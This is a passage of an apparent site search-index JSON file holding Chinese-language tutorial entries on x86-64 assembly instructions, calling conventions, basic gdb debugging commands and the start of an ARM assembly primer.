\u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u57fa\u6570 ( base ) \u4e3a 0 movl $1, 0x4(%rax, %rcx) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u6bd4\u4f8b ( scale ) \u4e3a0","title":"3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes"},{"location":"Tutorial/Material/Reverse/#344-common-instructions","text":"\u5148\u8bf4\u4e0b\u6307\u4ee4\u540e\u7f00, \u4e4b\u524d\u8bb2\u8fc7\u8fd9\u91cc\u5c31\u91cd\u6e29\u4e00\u904d : \u8bb8\u591a\u6307\u4ee4\u90fd\u6709\u4e2a\u540e\u7f00 ( b, w, l, q ) , \u540e\u7f00\u6307\u660e\u4e86\u8fd9\u4e2a\u6307\u4ee4\u4ee3\u7801\u6240\u64cd\u7eb5\u53c2\u6570\u6570\u636e\u7684\u4f4d\u5bbd ( \u5206\u522b\u4e3a 1, 2, 4 \u6216 8 \u4e2a\u5b57\u8282 ). \u5f53\u7136, \u5982\u679c\u53ef\u4ee5\u4ece\u53c2\u6570\u786e\u5b9a\u4f4d\u5bbd\u7684\u65f6\u5019, \u540e\u7f00\u53ef\u4ee5\u88ab\u7701\u7565. \u4f8b\u5982\u5462, \u5982\u679c\u76ee\u6807\u5bc4\u5b58\u5668\u662f %eax, \u5219\u5b83\u5fc5\u987b\u662f 4 \u5b57\u8282\u5bbd, \u5982\u679c\u662f %ax \u5bc4\u5b58\u5668, \u5219\u5fc5\u987b\u662f 2 \u4e2a\u5b57\u8282, \u800c %al \u5c06\u662f 1 \u4e2a\u5b57\u8282. \u8fd8\u6709\u4e9b\u6307\u4ee4, \u6bd4\u5982 movs \u548c movz \u6709\u4e24\u4e2a\u540e\u7f00 : \u7b2c\u4e00\u4e2a\u662f\u6765\u6e90\u53c2\u6570, \u7b2c\u4e8c\u4e2a\u662f\u53bb\u8def. \u8fd9\u8bdd\u4e4d\u4e00\u770b\u8ba9\u4eba\u6478\u4e0d\u7740\u5934\u8111, \u4e14\u542c\u6211\u5206\u6790. \u4f8b\u5982, movzbl \u8fd9\u4e2a\u6307\u4ee4\u628a 1 \u4e2a\u5b57\u8282\u7684\u6765\u6e90\u53c2\u6570\u503c\u79fb\u52a8\u5230 4 \u4e2a\u5b57\u8282\u7684\u53bb\u8def. \u5f53\u76ee\u6807\u662f\u5b50\u5bc4\u5b58\u5668 ( sub-registers ) \u65f6, \u53ea\u6709\u5b50\u5bc4\u5b58\u5668\u7684\u7279\u5b9a\u5b57\u8282\u88ab\u5199\u5165, \u4f46\u6709\u4e00\u4e2a\u4f8b\u5916 : 32 \u4f4d\u6307\u4ee4\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u8bbe\u7f6e\u4e3a 0.","title":"3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions"},{"location":"Tutorial/Material/Reverse/#mov-lea","text":"\u5230\u76ee\u524d\u4e3a\u6b62, \u6211\u4eec\u9047\u5230\u7684\u6700\u9891\u7e41\u7684\u6307\u4ee4\u5c31\u662f mov , \u800c\u5b83\u6709\u5f88\u591a\u53d8\u79cd. \u5173\u4e8e mov \u6307\u4ee4\u5c31\u4e0d\u591a\u8bf4\u4e86, \u548c\u4e4b\u524d 32 \u4f4d x86 \u7684\u6ca1\u4ec0\u4e48\u533a\u522b. lea \u6307\u4ee4\u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684, \u4e0a\u4e00\u8282\u90fd\u6709, \u8fd9\u91cc\u5c31\u4e0d\u5e9f\u8bdd\u4e86. \u8fd9\u91cc\u5199\u51e0\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4f8b\u5b50 : mov 8(%rsp), %eax ;%eax = \u4ece\u5730\u5740 %rsp + 8 \u8bfb\u53d6\u7684\u503c lea 0x20(%rsp), %rdi ;%rdi = %rsp + 0x20 lea (%rdi,%rdx,1), %rax ;%rax = %rdi + %rdx \u5728\u628a\u8f83\u5c0f\u4f4d\u5bbd\u7684\u6570\u636e\u79fb\u52a8\u590d\u5236\u5230\u8f83\u5927\u4f4d\u5bbd\u7684\u60c5\u51b5\u4e0b, movs \u548c movz \u8fd9\u4e24\u4e2a\u53d8\u79cd\u6307\u4ee4\u7528\u4e8e\u6307\u5b9a\u600e\u4e48\u6837\u53bb\u586b\u5145\u5b57\u8282, \u56e0\u4e3a\u4f60\u662f\u4e00\u4e2a\u5c0f\u4e1c\u897f\u88ab\u79fb\u5230\u4e86\u4e00\u4e2a\u5927\u7a7a\u95f4, \u80af\u5b9a\u8fd8\u6709\u5730\u65b9\u662f\u7a7a\u7684, \u6240\u4ee5\u7a7a\u7684\u5730\u65b9\u8981\u586b\u8d77\u6765, \u62ff 0 \u6216\u8005 \u7b26\u53f7\u6269\u5c55 ( sign-extend ) \u6765\u586b\u5145. movsbl %al, %edx ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u7b26\u53f7\u6269\u5c55 \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx movzbl %al, %edx ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u96f6\u6269\u5c55 ( zero-extend ) \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx \u6709\u4e2a\u7279\u6b8a\u60c5\u51b5\u8981\u6ce8\u610f, \u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u5c06 32 \u4f4d\u503c\u5199\u5165\u5bc4\u5b58\u5668\u7684 mov \u6307\u4ee4, \u4e5f\u4f1a\u5c06\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u5f52\u96f6, \u5373\u9690\u5f0f\u96f6\u6269\u5c55\u5230\u4f4d\u5bbd q. \u8fd9\u4e2a\u89e3\u91ca\u4e86\u8bf8\u5982 mov %ebx, %ebx \u8fd9\u79cd\u6307\u4ee4, \u8fd9\u4e9b\u6307\u4ee4\u770b\u8d77\u6765\u5f88\u5947\u602a, \u4f46\u5b9e\u9645\u4e0a\u8fd9\u662f\u7528\u4e8e\u4ece 32 \u4f4d\u6269\u5c55\u5230 64 \u4f4d. \u56e0\u4e3a\u8fd9\u4e2a\u662f\u9ed8\u8ba4\u7684, \u6240\u4ee5\u6211\u4eec\u4e0d\u7528\u663e\u5f0f\u7684 movzlq \u6307\u4ee4. \u5f53\u7136, \u6709\u4e00\u4e2a movslq \u6307\u4ee4\u4e5f\u662f\u4ece 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d. cltq \u6307\u4ee4\u662f\u4e00\u4e2a\u5728 %rax \u4e0a\u8fd0\u884c\u7684\u4e13\u7528\u79fb\u52a8\u6307\u4ee4. \u8fd9\u4e2a\u6ca1\u6709\u53c2\u6570\u7684\u6307\u4ee4\u5728 %rax \u4e0a\u8fdb\u884c\u7b26\u53f7\u6269\u5c55, \u6e90\u4f4d\u5bbd\u4e3a L, \u76ee\u6807\u4f4d\u5bbd\u4e3a q. cltq ;\u5728 \uff05rax \u4e0a\u8fd0\u884c\uff0c\u5c06 4 \u5b57\u8282 src \u7b26\u53f7\u6269\u5c55\u4e3a 8 \u5b57\u8282 dst\uff0c\u7528\u4e8e movslq \uff05eax\uff0c\uff05rax","title":"mov \u548c lea \u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#_12","text":"\u4e8c\u8fdb\u5236\u7684\u8fd0\u7b97\u4e00\u822c\u662f\u4e24\u4e2a\u53c2\u6570, \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u6307\u4ee4\u8fd0\u7b97\u7684\u6765\u6e90, \u4e5f\u662f\u53bb\u8def\u7684\u6765\u6e90, \u5c31\u662f\u8bf4\u6211\u4eec\u628a\u8fd0\u7b97\u7ed3\u679c\u5b58\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\u91cc. \u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e24\u4e2a\u53c2\u6570\u4e2d, \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\u662f\u5185\u5b58\u5355\u5143, \u5f53\u7136\u4e5f\u6709\u7684\u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u6765\u6e90, \u4e5f\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u53bb\u8def, \u5b83\u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e2a\u6211\u4eec\u4e0a\u4e00\u8282\u8bb2\u4e86, \u8fd9\u91cc\u56de\u987e\u4e00\u4e0b. \u8bb8\u591a\u7b97\u672f\u6307\u4ee4\u7528\u4e8e\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u7c7b\u578b,\u4e5f\u5c31\u662f\u5e26\u7b26\u53f7\u52a0\u6cd5\u548c\u65e0\u7b26\u53f7\u52a0\u6cd5\u90fd\u4f7f\u7528\u76f8\u540c\u7684\u6307\u4ee4. \u5f53\u9700\u8981\u7684\u65f6\u5019, \u53c2\u6570\u8bbe\u7f6e\u7684\u6761\u4ef6\u4ee3\u7801\u53ef\u4ee5\u7528\u6765\u68c0\u6d4b\u4e0d\u540c\u7c7b\u578b\u7684\u6ea2\u51fa. add src, dst ;dst = dst + src sub src, dst ;dst = dst - src imul src, dst ;dst = dst * src neg dst ;dst = -dst ( \u7b97\u672f\u53d6\u53cd ) and src, dst ;dst = dst & src or src, dst ;dst = dst | src xor src, dst ;dst = dst ^ src not dst ;dst = ~dst ( \u6309\u4f4d\u53d6\u53cd ) shl count, dst ;dst <<= count ( \u6309 count \u7684\u503c\u6765\u5de6\u79fb ), \u8ddf\u8fd9\u4e2a\u76f8\u540c\u7684\u662f`sal`\u6307\u4ee4 sar count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u7b97\u672f\u53f3\u79fb ) shr count, dst ;dst = count ( \u6309 count \u7684\u503c\u6765\u903b\u8f91\u53f3\u79fb ) ;\u67d0\u4e9b\u6307\u4ee4\u6709\u7279\u6b8a\u60c5\u51b5\u53d8\u4f53, \u8fd9\u4e9b\u53d8\u4f53\u6709\u4e0d\u540c\u7684\u53c2\u6570 imul src ;\u4e00\u4e2a\u53c2\u6570\u7684 imul \u6307\u4ee4\u5047\u5b9a %rax \u4e2d\u5176\u4ed6\u53c2\u6570\u8ba1\u7b97 128 \u4f4d\u7684\u7ed3\u679c, \u5728 %rdx \u4e2d\u5b58\u50a8\u9ad8 64 \u4f4d, \u5728 %rax \u4e2d\u5b58\u50a8\u4f4e 64 \u4f4d. shl dst ;dst <<= 1 ( \u540e\u9762\u6ca1\u6709 count \u53c2\u6570\u7684\u65f6\u5019\u9ed8\u8ba4\u662f\u79fb\u52a8 1 \u4f4d, `sar`, `shr`, `sal` \u6307\u4ee4\u4e5f\u662f\u4e00\u6837 ) \u8fd9\u4e9b\u6307\u4ee4\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u7a0d\u5fae\u63d0\u4e00\u4e0b.","title":"\u7b97\u672f\u548c\u4f4d\u8fd0\u7b97"},{"location":"Tutorial/Material/Reverse/#_13","text":"\u6709\u4e00\u4e2a\u7279\u6b8a\u7684 %eflags \u5bc4\u5b58\u5668, \u5b83\u5b58\u7740\u4e00\u7ec4\u88ab\u79f0\u4e3a\u6761\u4ef6\u4ee3\u7801\u7684\u5e03\u5c14\u6807\u5fd7. \u5927\u591a\u6570\u7684\u7b97\u672f\u8fd0\u7b97\u4f1a\u66f4\u65b0\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801. \u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u8bfb\u53d6\u8fd9\u4e9b\u6761\u4ef6\u4ee3\u7801\u4e4b\u540e, \u518d\u786e\u5b9a\u662f\u5426\u6267\u884c\u76f8\u5e94\u7684\u5206\u652f\u6307\u4ee4. \u6761\u4ef6\u4ee3\u7801\u5305\u62ec ZF( \u96f6\u6807\u5fd7 ), SF( \u7b26\u53f7\u6807\u5fd7 ), OF( \u6ea2\u51fa\u6807\u5fd7, \u6709\u7b26\u53f7 ) \u548c CF( \u8fdb\u4f4d\u6807\u5fd7, \u65e0\u7b26\u53f7 ). \u4f8b\u5982, \u5982\u679c\u7ed3\u679c\u4e3a 0 , \u5219\u8bbe\u7f6e ZF, \u5982\u679c\u64cd\u4f5c\u6ea2\u51fa ( \u8fdb\u5165\u7b26\u53f7\u4f4d ), \u5219\u8bbe\u7f6e OF. \u8fd9\u4e9b\u6307\u4ee4\u4e00\u822c\u662f\u5148\u6267\u884c cmp \u6216 test \u64cd\u4f5c\u6765\u8bbe\u7f6e\u6807\u5fd7, \u7136\u540e\u518d\u8ddf\u8df3\u8f6c\u6307\u4ee4\u53d8\u91cf, \u8be5\u53d8\u91cf\u8bfb\u53d6\u6807\u5fd7\u6765\u786e\u5b9a\u662f\u91c7\u7528\u5206\u652f\u4ee3\u7801\u8fd8\u662f\u7ee7\u7eed\u4e0b\u4e00\u6761\u4ee3\u7801. cmp \u6216 test \u7684\u53c2\u6570\u662f\u7acb\u5373\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143 ( \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u5185\u5b58\u53c2\u6570 ). \u6761\u4ef6\u8df3\u8f6c\u6709 32 \u4e2d\u53d8\u4f53, \u5176\u4e2d\u51e0\u79cd\u6548\u679c\u662f\u4e00\u6837\u7684. \u4e0b\u9762\u662f\u4e00\u4e9b\u5206\u652f\u6307\u4ee4. cmpl op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 - op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801 test op2, op1 ;\u8fd0\u7b97\u7ed3\u679c = op1 & op2, \u4e22\u5f03\u7ed3\u679c\u7136\u540e\u8bbe\u7f6e\u6761\u4ef6\u4ee3\u7801 jmp target ;\u65e0\u6761\u4ef6\u8df3\u8dc3 je target ;\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jz, \u5373jump zero ( ZF = 1 ) jne target ;\u4e0d\u76f8\u7b49\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnz, \u5373 jump non zero ( ZF = 0 ) jl target ;\u5c0f\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnge, \u5373 jump not greater or equal ( SF != OF ) jle target ;\u5c0f\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jng, \u5373 jump not greater ( ZF = 1 or SF != OF ) jg target ;\u5927\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnle, \u5373 jump not less or equal ( ZF = 0 and SF = OF ) jge target ;\u5927\u4e8e\u7b49\u4e8e\u65f6\u8df3\u8dc3, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnl, \u5373 jump not less ( SF = OF ) ja target ;\u8df3\u5230\u4e0a\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnbe, \u5373 jump not below or equal ( CF = 0 and ZF = 0 ) jb target ;\u8df3\u5230\u4e0b\u9762, \u548c\u5b83\u76f8\u540c\u7684\u8fd8\u6709 jnae, \u5373 jump not above or equal ( CF = 1 ) js target ;SF = 1 \u65f6\u8df3\u8dc3 jns target ;SF = 0 \u65f6\u8df3\u8dc3 \u5176\u5b9e\u4f60\u4e5f\u4f1a\u53d1\u73b0\u8fd9\u91cc\u5927\u90e8\u5206\u4e0a\u4e00\u8282\u90fd\u8bb2\u8fc7, \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u518d\u6765\u4e00\u904d\u5de9\u56fa\u4e00\u4e0b.","title":"\u6d41\u7a0b\u63a7\u5236\u6307\u4ee4"},{"location":"Tutorial/Material/Reverse/#setxmovx","text":"\u8fd8\u6709\u4e24\u4e2a\u6307\u4ee4\u5bb6\u65cf\u53ef\u4ee5 \u8bfb\u53d6/\u54cd\u5e94 \u5f53\u524d\u7684\u6761\u4ef6\u4ee3\u7801. setx \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x \u7684\u72b6\u6001\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u8bbe\u7f6e\u4e3a 0 \u6216 1. cmovx \u6307\u4ee4\u6839\u636e\u6761\u4ef6 x \u662f\u5426\u6210\u7acb\u6765\u6709\u6761\u4ef6\u5730\u6267\u884c mov. x \u662f\u4efb\u4f55\u6761\u4ef6\u53d8\u91cf\u7684\u5360\u4f4d\u7b26, \u5c31\u662f\u8bf4 x \u53ef\u4ee5\u7528\u8fd9\u4e9b\u6765\u4ee3\u66ff : e, ne, s, ns. \u5b83\u4eec\u7684\u610f\u601d\u4e0a\u9762\u4e5f\u90fd\u8bf4\u8fc7\u4e86. sete dst ;\u6839\u636e \u96f6/\u76f8\u7b49( zero/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1 setge dst ;\u6839\u636e \u5927\u4e8e/\u76f8\u7b49( greater/equal ) \u6761\u4ef6\u6765\u628a dst \u8bbe\u7f6e\u6210 0 \u6216 1 cmovns src, dst ;\u5982\u679c ns \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov cmovle src, dst ;\u5982\u679c le \u6761\u4ef6\u6210\u7acb, \u5219\u7ee7\u7eed\u6267\u884c mov \u5bf9\u4e8e setx \u6307\u4ee4, \u5176\u76ee\u6807\u5fc5\u987b\u662f\u5355\u5b57\u8282\u5bc4\u5b58\u5668 ( \u4f8b\u5982 %al \u7528\u4e8e %rax \u7684\u4f4e\u5b57\u8282 ). \u5bf9\u4e8e cmovx \u6307\u4ee4, \u5176\u6765\u6e90\u548c\u53bb\u8def\u90fd\u5fc5\u987b\u662f\u5bc4\u5b58\u5668.","title":"setx\u548cmovx"},{"location":"Tutorial/Material/Reverse/#_14","text":"%rsp \u5bc4\u5b58\u5668\u7528\u4f5c \" \u6808\u6307\u9488 \"; push \u548c pop \u7528\u4e8e\u6dfb\u52a0\u6216\u8005\u5220\u9664\u6808\u5185\u5b58\u4e2d\u7684\u503c. push \u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u5185\u5b58\u5355\u5143. push \u6307\u4ee4\u5148\u628a %rsp \u7684\u503c\u9012\u51cf, \u7136\u540e\u5c06\u53c2\u6570\u590d\u5236\u5230\u6808\u5185\u5b58\u4e0a\u7684 tompost. pop \u6307\u4ee4\u4e5f\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u76ee\u6807\u5bc4\u5b58\u5668. pop \u5148\u628a\u6808\u5185\u5b58\u6700\u9876\u5c42\u7684\u503c\u590d\u5236\u5230\u76ee\u6807\u5bc4\u5b58\u5668, \u7136\u540e\u628a %rsp \u9012\u589e. \u76f4\u63a5\u8c03\u6574 %rsp, \u4ee5\u901a\u8fc7\u5355\u4e2a\u53c2\u6570\u6dfb\u52a0\u6216\u5220\u9664\u6574\u4e2a\u6570\u7ec4\u6216\u53d8\u91cf\u96c6\u5408\u4e5f\u662f\u53ef\u4ee5\u7684. \u4f46\u6ce8\u610f, \u6808\u5185\u5b58\u662f\u671d\u4e0b\u589e\u957f ( \u5373\u671d\u5411\u8f83\u4f4e\u5730\u5740 ). push %rbx ;\u628a %rbx \u5165\u6808 pushq $0x3 ;\u628a\u7acb\u5373\u6570 3 \u5165\u6808 sub $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u7a7a\u51fa 16 \u5b57\u8282 pop %rax ;\u628a\u6808\u4e2d\u6700\u9876\u5c42\u7684\u503c\u51fa\u6808\u5230\u5bc4\u5b58\u5668 %rax \u4e2d add $0x10, %rsp ;\u8c03\u6574\u6808\u6307\u9488\u4ee5\u5220\u9664\u6700\u9876\u5c42\u7684 16 \u4e2a\u5b57\u8282 \u51fd\u6570\u4e4b\u95f4\u662f\u901a\u8fc7\u4e92\u76f8\u8c03\u7528\u8fd4\u56de\u6765\u4e92\u76f8\u63a7\u5236\u7684. callq \u6307\u4ee4\u6709\u4e00\u4e2a\u53c2\u6570, \u5373\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. \u5b83\u5c06\u8fd4\u56de\u6765\u7684\u5730\u5740\u5165\u6808, \u8fd9\u4e2a\u8fd4\u56de\u6765\u7684\u5730\u5740\u5373 %rip \u5f53\u524d\u7684\u503c, \u4e5f\u5373\u662f\u8c03\u7528\u51fd\u6570\u540e\u7684\u4e0b\u4e00\u6761\u6307\u4ee4. \u7136\u540e\u8fd9\u4e2a\u6307\u4ee4\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u88ab\u8c03\u7528\u7684\u51fd\u6570\u7684\u5730\u5740. retq \u6307\u4ee4\u628a\u521a\u624d\u5165\u6808\u7684\u5730\u5740\u7ed9\u51fa\u6808, \u8ba9\u5b83\u56de\u5230 %rip \u4e2d, \u4ece\u800c\u8ba9\u7a0b\u5e8f\u5728\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u5904\u91cd\u65b0\u5f00\u59cb, \u5c31\u662f\u8bf4\u4f60\u4e2d\u9014\u8df3\u5230\u522b\u7684\u5730\u65b9\u53bb, \u4f60\u56de\u6765\u7684\u65f6\u5019\u8981\u4ece\u4f60\u8df3\u7684\u90a3\u4e2a\u5730\u65b9\u91cd\u65b0\u5f00\u59cb. \u5f53\u7136, \u4f60\u5982\u679c\u8981\u8bbe\u7f6e\u8fd9\u79cd\u51fd\u6570\u95f4\u7684\u4e92\u76f8\u8c03\u7528, \u8c03\u7528\u8005\u9700\u8981\u5c06\u524d\u516d\u4e2a\u53c2\u6570\u653e\u5165\u5bc4\u5b58\u5668 %rdi, %rsi, %rdx, %rcx, %r8 \u548c %r9 ( \u4efb\u4f55\u5176\u5b83\u53c2\u6570\u90fd\u5165\u6808 ), \u7136\u540e\u518d\u6267\u884c\u8c03\u7528\u6307\u4ee4. mov $0x3, %rdi ;\u7b2c\u4e00\u4e2a\u53c2\u6570\u5728 %rdi \u4e2d mov $0x7, %rsi ;\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 %rsi \u4e2d callq binky ;\u628a\u7a0b\u5e8f\u4ea4\u7ed9 binky \u63a7\u5236 \u5f53\u88ab\u8c03\u7528\u8005\u90a3\u4e2a\u51fd\u6570\u5b8c\u4e8b\u7684\u65f6\u5019, \u8fd9\u4e2a\u51fd\u6570\u5c06\u8fd4\u56de\u503c ( \u5982\u679c\u6709\u7684\u8bdd ) \u5199\u5165 %rax, \u7136\u540e\u6e05\u7406\u6808\u5185\u5b58, \u5e76\u4f7f\u7528 retq \u6307\u4ee4\u628a\u7a0b\u5e8f\u63a7\u5236\u6743\u4ea4\u8fd8\u7ed9\u8c03\u7528\u8005. mov $0x0, %eax ;\u5c06\u8fd4\u56de\u503c\u5199\u5165 %rax add $0x10, %rsp ;\u6e05\u7406\u6808\u5185\u5b58 retq ;\u4ea4\u8fd8\u63a7\u5236\u6743, \u8df3\u56de\u53bb \u8fd9\u4e9b\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u7684\u76ee\u6807\u901a\u5e38\u662f\u5728\u7f16\u8bd1\u65f6\u786e\u5b9a\u7684\u7edd\u5bf9\u5730\u5740. \u4f46\u662f, \u6709\u4e9b\u60c5\u51b5\u4e0b\u76f4\u5230\u8fd0\u884c\u7a0b\u5e8f\u7684\u65f6\u5019, \u6211\u4eec\u624d\u77e5\u9053\u76ee\u6807\u7684\u7edd\u5bf9\u5185\u5b58\u5730\u5740. \u4f8b\u5982\u7f16\u8bd1\u4e3a\u8df3\u8f6c\u8868\u7684 switch \u8bed\u53e5\u6216\u8c03\u7528\u51fd\u6570\u6307\u9488\u65f6. \u5bf9\u4e8e\u8fd9\u4e9b, \u6211\u4eec\u5148\u8ba1\u7b97\u76ee\u6807\u5730\u5740, \u7136\u540e\u628a\u5730\u5740\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d, \u7136\u540e\u7528 \u5206\u652f/\u8c03\u7528( branch/call ) \u53d8\u91cf je *%rax \u6216 callq *%rax \u4ece\u6307\u5b9a\u5bc4\u5b58\u5668\u4e2d\u8bfb\u53d6\u76ee\u6807\u5730\u5740. \u5f53\u7136\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5, \u5c31\u662f\u4e0a\u4e00\u8282\u8bb2\u7684\u6253\u6807\u7b7e.","title":"\u51fd\u6570\u8c03\u7528\u4e0e\u6808"},{"location":"Tutorial/Material/Reverse/#345-gdb","text":"\u8c03\u8bd5\u5668 ( debugger ) \u6709\u8bb8\u591a\u529f\u80fd, \u8fd9\u53ef\u4ee5\u8ba9\u4f60\u53ef\u4ee5\u5728\u7a0b\u5e8f\u4e2d\u8ffd\u8e2a\u548c\u8c03\u8bd5\u4ee3\u7801. \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u5176\u540d\u79f0\u4e0a\u52a0\u4e2a $ \u6765\u6253\u5370\u5bc4\u5b58\u5668\u4e2d\u7684\u503c, \u6216\u8005\u4f7f\u7528\u547d\u4ee4 info reg \u8f6c\u50a8\u6240\u6709\u5bc4\u5b58\u5668\u7684\u503c : (gdb) p $rsp (gdb) info reg disassemble \u547d\u4ee4\u6309\u7167\u540d\u79f0\u6253\u5370\u51fd\u6570\u7684\u53cd\u6c47\u7f16. x \u547d\u4ee4\u652f\u6301 i \u683c\u5f0f, \u8fd9\u4e2a\u683c\u5f0f\u628a\u5185\u5b58\u5730\u5740\u7684\u5185\u5bb9\u89e3\u91ca\u4e3a\u7f16\u7801\u6307\u4ee4 ( \u89e3\u7801 ). (gdb) disassemble main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u6240\u6709 main \u51fd\u6570\u7684\u6307\u4ee4 (gdb) x/8i main //\u53cd\u6c47\u7f16, \u7136\u540e\u6253\u5370\u5f00\u59cb\u7684 8 \u6761\u6307\u4ee4 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u51fd\u6570\u4e2d\u7684\u76f4\u63a5\u5730\u5740\u6216\u504f\u79fb\u91cf\u4e3a\u7279\u5b9a\u6c47\u7f16\u6307\u4ee4\u8bbe\u7f6e\u65ad\u70b9. (gdb) b *0x08048375 (gdb) b *main+7 //\u5728 main+7\u4e2a\u5b57\u8282\u8fd9\u91cc\u8bbe\u7f6e\u65ad\u70b9 \u4f60\u53ef\u4ee5\u7528 stepi \u548c nexti \u547d\u4ee4\u6765\u8ba9\u7a0b\u5e8f\u901a\u8fc7\u6307\u4ee4 ( \u800c\u4e0d\u662f\u6e90\u4ee3\u7801 ) \u5f80\u524d\u6267\u884c. (gdb) stepi (gdb) nexti","title":"3.4.5 \u6c47\u7f16\u548c gdb"},{"location":"Tutorial/Material/Reverse/#35-arm","text":"","title":"3.5 ARM\u6c47\u7f16\u57fa\u7840"},{"location":"Tutorial/Material/Reverse/#351","text":"\u672c\u7ae0\u6240\u8bb2\u8ff0\u7684\u662f\u5728 GNU \u6c47\u7f16\u7a0b\u5e8f\u4e0b\u7684 ARM \u6c47\u7f16\u5feb\u901f\u6307\u5357\uff0c\u800c\u6240\u6709\u7684\u4ee3\u7801\u793a\u4f8b\u90fd\u4f1a\u91c7\u7528\u4e0b\u9762\u7684\u7ed3\u6784\uff1a [< \u6807\u7b7e label :] {<\u6307\u4ee4 instruction or directive } @ \u6ce8\u91ca comment \u5728 GNU \u7a0b\u5e8f\u4e2d\u4e0d\u9700\u8981\u7f29\u8fdb\u6307\u4ee4\u3002\u7a0b\u5e8f\u7684\u6807\u7b7e\u662f\u7531\u5192\u53f7\u8bc6\u522b\u800c\u4e0e\u6240\u5904\u7684\u4f4d\u7f6e\u65e0\u5173\u3002 \u5c31\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\uff1a .section .text, \"x\" .global add @\u7ed9\u7b26\u53f7\u6dfb\u52a0\u5916\u90e8\u94fe\u63a5 add: ADD r0, r0, r1 @\u6dfb\u52a0\u8f93\u5165\u53c2\u6570 MOV pc, lr @\u4ece\u5b50\u7a0b\u5e8f\u8fd4\u56de @\u7a0b\u5e8f\u7ed3\u675f \u5b83\u5b9a\u4e49\u7684\u662f\u4e00\u4e2a\u8fd4\u56de\u603b\u548c\u51fd\u6570 \u201c add 